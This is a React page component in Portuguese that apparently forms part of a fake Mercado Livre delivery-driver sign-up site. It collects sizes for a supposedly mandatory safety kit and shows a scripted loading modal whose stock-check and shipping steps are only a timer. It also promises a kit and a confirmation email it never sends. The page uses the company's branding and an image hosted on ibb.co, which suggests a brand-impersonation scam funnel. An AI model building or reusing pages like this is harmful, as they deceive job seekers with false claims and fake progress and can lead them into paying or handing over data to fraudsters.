import React, { useState, useEffect, useRef } from 'react';
import { useLocation } from 'wouter';
import { z } from 'zod';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';

import Header from '@/components/Header';
import Footer from '@/components/Footer';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Card } from '@/components/ui/card';
import { Checkbox } from '@/components/ui/checkbox';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { useToast } from '@/hooks/use-toast';
import { LoadingModal } from '@/components/LoadingModal';
import { useScrollTop } from '@/hooks/use-scroll-top';

// Nova imagem do kit EPI Mercado Livre
const kitEpiImage = 'https://i.ibb.co/zVWPpfKm/Inserir-um-ti-tulo-1-1.webp';

const finalizacaoSchema = z.object({
  tamanhoColete: z.enum(['P', 'M', 'G', 'GG']),
  tamanhoLuva: z.enum(['P', 'M', 'G', 'GG']),
  numeroCalcado: z.string().min(2, "Número de calçado inválido"),
  termoUso: z.boolean().refine(val => val === true, "Você precisa aceitar os termos de uso"),
});

type FinalizacaoFormValues = z.infer<typeof finalizacaoSchema>;

const Finalizacao: React.FC = () => {
  // Aplica o scroll para o topo quando o componente é montado
  useScrollTop();
  
  const [, navigate] = useLocation();
  const { toast } = useToast();
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showLoadingModal, setShowLoadingModal] = useState(false);
  const [formSubmitted, setFormSubmitted] = useState(false);
  const [selectedShoeSize, setSelectedShoeSize] = useState<string>("40");
  const [buttonShaking, setButtonShaking] = useState(false);
  
  const submitButtonRef = useRef<HTMLButtonElement>(null);

  const { register, handleSubmit, formState: { errors }, setValue, watch } = useForm<FinalizacaoFormValues>({
    resolver: zodResolver(finalizacaoSchema),
    defaultValues: {
      tamanhoColete: 'M',
      tamanhoLuva: 'M',
      numeroCalcado: '40',
      termoUso: false,
    }
  });
  
  // Função para alternar o estado do checkbox dos termos de uso
  const handleTermsToggle = () => {
    // Obter o valor atual e alterniar para o oposto
    const currentValue = watch('termoUso');
    setValue('termoUso', !currentValue, { shouldValidate: true });
  };

  // Função para selecionar o tamanho do calçado
  const handleShoeSize = (size: string) => {
    setSelectedShoeSize(size);
    setValue('numeroCalcado', size, { shouldValidate: true });
  };
  
  // Função para lidar com erros de validação do formulário
  const handleFormError = (errors: any) => {
    // Se o erro for relacionado aos termos de uso, aplicar a animação de shake no botão
    if (errors.termoUso) {
      setButtonShaking(true);
      
      // Após a animação terminar, remover a classe
      setTimeout(() => {
        setButtonShaking(false);
      }, 600); // 600ms é a duração da animação de shake
      
      // Exibir mensagem de toast sobre os termos
      toast({
        title: "Aceite os termos de uso",
        description: "Para prosseguir, você precisa concordar com os termos de uso.",
        variant: "destructive",
      });
    }
  };
  
  const handleFormSubmit = (data: FinalizacaoFormValues) => {
    setIsSubmitting(true);
    
    try {
      // Atualizando o tamanho do calçado a partir do estado
      const updatedData = {
        ...data,
        numeroCalcado: selectedShoeSize
      };
      
      // Salvando dados no localStorage
      localStorage.setItem('epi_data', JSON.stringify(updatedData));
      
      // Iniciar processo de carregamento
      setShowLoadingModal(true);
    } catch (error) {
      toast({
        title: "Erro ao salvar dados",
        description: "Ocorreu um erro ao processar suas informações. Tente novamente.",
        variant: "destructive",
      });
      setIsSubmitting(false);
    }
  };

  const handleLoadingComplete = () => {
    setShowLoadingModal(false);
    // Redirecionar para a página de entrega em vez de mostrar a tela de finalização
    navigate('/entrega');
  };

  const handleFinalizar = () => {
    navigate('/');
    toast({
      title: "Cadastro finalizado!",
      description: "Parabéns! Seu cadastro foi concluído com sucesso. Em breve entraremos em contato.",
    });
  };

  return (
    <div className="bg-white min-h-screen flex flex-col">
      <Header />
      
      <div className="w-full bg-[#FFE602] py-1 px-6 flex items-center relative overflow-hidden border-t border-[#272F76]">
        {/* Meia-lua no canto direito */}
        <div className="absolute right-0 top-0 bottom-0 w-32 h-full rounded-l-full bg-[#FFD100]"></div>
        
        <div className="flex items-center relative z-10">
          <div className="text-[#303674] mr-3">
            <i className="fas fa-chevron-right text-3xl font-black" style={{color: '#303674'}}></i>
          </div>
          <div className="leading-none">
            <h1 className="text-base font-bold text-[#303674] mb-0">Motorista Parceiro</h1>
            <p className="text-[#303674] text-sm mt-0" style={{transform: 'translateY(-2px)'}}>Mercado Livre</p>
          </div>
        </div>
      </div>
      
      <div className="flex-grow container mx-auto px-2 py-8 w-full">
        <div className="w-full mx-auto p-6 mb-8">
          {!formSubmitted ? (
            <>
              <h1 className="text-3xl font-bold text-center mb-8 text-gray-800">Kit de Segurança</h1>
              
              <div className="mb-8">
                <Card className="overflow-hidden">
                  <div className="bg-[#F8F8FF] p-4 border-b border-[#30367420]">
                    <h3 className="font-semibold text-[#303674]">Equipamento de Proteção Individual (EPI)</h3>
                  </div>
                  <div className="p-6">
                    <div className="flex flex-col md:flex-row gap-6 items-center">
                      <div className="w-full md:w-2/5">
                        <img 
                          src={kitEpiImage} 
                          alt="Kit EPI Mercado Livre" 
                          className="w-full rounded-lg"
                        />
                      </div>
                      <div className="w-full md:w-3/5">
                        <h4 className="text-lg font-medium mb-3">Kit Completo de Segurança</h4>
                        <p className="text-gray-600 mb-4">
                          Para garantir sua segurança durante as entregas, o Mercado Livre exige que todos os entregadores 
                          utilizem equipamentos de proteção individual. O kit inclui:
                        </p>
                        <ul className="list-disc pl-5 mb-4 space-y-1 text-gray-700">
                          <li>2 Coletes refletivos com identificação Mercado Livre (azul e amarelo)</li>
                          <li>Par de luvas de proteção</li>
                          <li>Botas de segurança antiderrapantes</li>
                        </ul>
                        <div className="bg-yellow-50 p-3 rounded-md border border-yellow-200">
                          <p className="text-sm text-yellow-800">
                            <strong>Importante:</strong> O uso do kit completo é obrigatório durante todas 
                            as entregas. O não uso pode resultar em suspensão temporária.
                          </p>
                        </div>
                      </div>
                    </div>
                  </div>
                </Card>
              </div>
              
              <form onSubmit={handleSubmit(handleFormSubmit, handleFormError)} className="space-y-6">
                <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                  <div>
                    <label htmlFor="tamanhoColete" className="block text-base font-medium text-gray-800 mb-2">
                      Tamanho do Colete
                    </label>
                    <Select
                      onValueChange={(value) => setValue('tamanhoColete', value as any)}
                      defaultValue={watch('tamanhoColete')}
                    >
                      <SelectTrigger className="w-full">
                        <SelectValue placeholder="Selecione o tamanho" />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="P">P</SelectItem>
                        <SelectItem value="M">M</SelectItem>
                        <SelectItem value="G">G</SelectItem>
                        <SelectItem value="GG">GG</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>
                  
                  <div>
                    <label htmlFor="tamanhoLuva" className="block text-base font-medium text-gray-800 mb-2">
                      Tamanho da Luva
                    </label>
                    <Select
                      onValueChange={(value) => setValue('tamanhoLuva', value as any)}
                      defaultValue={watch('tamanhoLuva')}
                    >
                      <SelectTrigger className="w-full">
                        <SelectValue placeholder="Selecione o tamanho" />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="P">P</SelectItem>
                        <SelectItem value="M">M</SelectItem>
                        <SelectItem value="G">G</SelectItem>
                        <SelectItem value="GG">GG</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>
                  
                  <div>
                    <label htmlFor="numeroCalcado" className="block text-base font-medium text-gray-800 mb-2">
                      Número do Calçado
                    </label>
                    <div className="grid grid-cols-3 md:grid-cols-4 lg:grid-cols-5 gap-2">
                      {Array.from({ length: 11 }, (_, i) => (i + 35).toString()).map((size) => (
                        <Button
                          key={size}
                          type="button"
                          variant="outline"
                          onClick={() => handleShoeSize(size)}
                          className={`py-2 px-4 ${
                            selectedShoeSize === size 
                              ? 'bg-[#303674] text-white border-[#303674] hover:bg-[#242960]' 
                              : 'border-gray-300 hover:border-[#303674] hover:text-[#303674]'
                          }`}
                        >
                          {size}
                        </Button>
                      ))}
                    </div>
                    <input 
                      type="hidden" 
                      {...register('numeroCalcado')} 
                      value={selectedShoeSize} 
                    />
                    {errors.numeroCalcado && (
                      <p className="mt-1 text-sm text-red-600">{errors.numeroCalcado.message}</p>
                    )}
                  </div>
                </div>
                
                <div className="flex items-start space-x-2 my-6">
                  <Checkbox
                    id="termoUso" 
                    {...register('termoUso')}
                    className={errors.termoUso ? 'border-red-500' : 'border-[#303674] data-[state=checked]:bg-[#303674] data-[state=checked]:text-white'}
                    onCheckedChange={() => handleTermsToggle()}
                  />
                  <div className="grid gap-1.5 leading-none" onClick={() => handleTermsToggle()}>
                    <label
                      htmlFor="termoUso"
                      className="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70 cursor-pointer"
                    >
                      Concordo com os termos de uso e política de segurança do Mercado Livre
                    </label>
                    <p className="text-sm text-gray-500">
                      Declaro que usarei os equipamentos de proteção durante todas as entregas.
                    </p>
                    {errors.termoUso && (
                      <p className="text-sm text-red-600">{errors.termoUso.message}</p>
                    )}
                  </div>
                </div>
                
                <Button
                  ref={submitButtonRef}
                  type="submit"
                  className={`w-full bg-[#303674] hover:bg-[#242960] text-white font-medium py-6 text-base rounded-[3px] ${buttonShaking ? 'shake-animation' : ''}`}
                  disabled={isSubmitting}
                  style={{ height: '50px' }}
                >
                  {isSubmitting ? 'Processando...' : 'Solicitar Kit e Finalizar'}
                </Button>
              </form>
            </>
          ) : (
            <div className="max-w-2xl mx-auto text-center">
              <div className="text-[#303674] mb-6">
                <svg xmlns="http://www.w3.org/2000/svg" width="80" height="80" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="mx-auto">
                  <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
                  <polyline points="22 4 12 14.01 9 11.01"></polyline>
                </svg>
              </div>
              
              <h1 className="text-3xl font-bold mb-6 text-gray-800">Cadastro Concluído!</h1>
              
              <p className="text-lg text-gray-600 mb-8">
                Parabéns! Seu cadastro como Entregador Parceiro Mercado Livre foi concluído com sucesso.
                Seu kit EPI será enviado para o endereço cadastrado em até 5 dias úteis.
              </p>
              
              <div className="bg-[#F8F8FF] p-4 rounded-lg border border-[#30367420] mb-8">
                <h3 className="font-semibold text-[#303674] mb-2">Próximos Passos:</h3>
                <ol className="list-decimal pl-6 text-left text-gray-700 space-y-2">
                  <li>Você receberá um e-mail de confirmação em até 24 horas.</li>
                  <li>O kit EPI será enviado em até 5 dias úteis.</li>
                  <li>Após o recebimento do kit, você já poderá começar a receber entregas.</li>
                  <li>Download do aplicativo de entregas Mercado Livre (enviado por e-mail).</li>
                </ol>
              </div>
              
              <Button
                onClick={handleFinalizar}
                className="bg-[#303674] hover:bg-[#242960] text-white font-medium py-6 text-base rounded-[3px] min-w-[200px]"
                style={{ height: '50px' }}
              >
                Voltar ao Início
              </Button>
            </div>
          )}
        </div>
      </div>
      
      <Footer />
      
      <LoadingModal
        isOpen={showLoadingModal}
        onComplete={handleLoadingComplete}
        title="Finalizando Cadastro"
        loadingSteps={[
          "Registrando tamanhos do kit EPI",
          "Verificando disponibilidade em estoque",
          "Preparando envio do material",
          "Finalizando cadastro de entregador"
        ]}
        completionMessage="Cadastro finalizado com sucesso!"
        loadingTime={12000}
      />
    </div>
  );
};

export default Finalizacao;